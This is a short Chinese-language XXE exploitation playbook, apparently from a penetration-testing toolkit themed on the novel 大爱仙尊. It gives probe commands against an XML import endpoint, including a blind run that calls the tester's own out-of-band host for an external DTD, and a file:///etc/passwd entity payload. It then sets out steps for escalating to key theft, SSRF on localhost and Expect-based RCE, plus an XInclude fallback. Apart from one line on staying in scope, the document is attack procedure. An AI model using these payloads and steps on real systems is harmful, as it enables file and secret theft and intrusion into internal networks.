# 大爱仙尊 XXE 作业手法

> 杀招：`噬文·试`（作业）· `xxe-exploitation`（附录）  
> 工具：`python3 炼蛊房/tpl_inject_probe.py xxe`  
> 升内网：`ssrf_probe.py` · `定仙游.md`  
> 专卡：Tika / GeoServer / SharePoint 仍走各自手法

目标须在 scope。`core_web_surface_probe` **没有** `--xxe` 开关，单点用本探针。

---

## 1. 立刻跑

```bash
python3 炼蛊房/tpl_inject_probe.py xxe --url https://授权/api/import --case <案>
# 盲 XXE：参数实体打你的 OOB
python3 炼蛊房/tpl_inject_probe.py xxe --url https://授权/api/import --oob http://你的OOB/xxe.dtd --case <案>
```

产物：`案卷/tpl_inject/xxe.json`。

---

## 2. 四刀

1. **找解析器** — `Content-Type: application/xml`、SOAP、SAML、SVG/OOXML 上传  
2. **有回显** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 正文出现 `root:`  
3. **盲/OOB** — 参数实体 `%dtd;` 拉外部 DTD；没回包不算阴性  
4. **升级** — `file://` 读钥；`http://127.0.0.1` 当 SSRF。Expect/RCE 授权内直接做

禁用 DTD 时试 XInclude。SVG 被转 PNG 是假点，换 OOXML 或 SOAP。

---

## 3. 档位

| 档 | 成立 |
|----|------|
| L1 | 解析器抱怨 DOCTYPE / entity |
| L2 | 读到 passwd 或 OOB 回连 |
| L3 | 读到密钥 / 打进内网服务 |
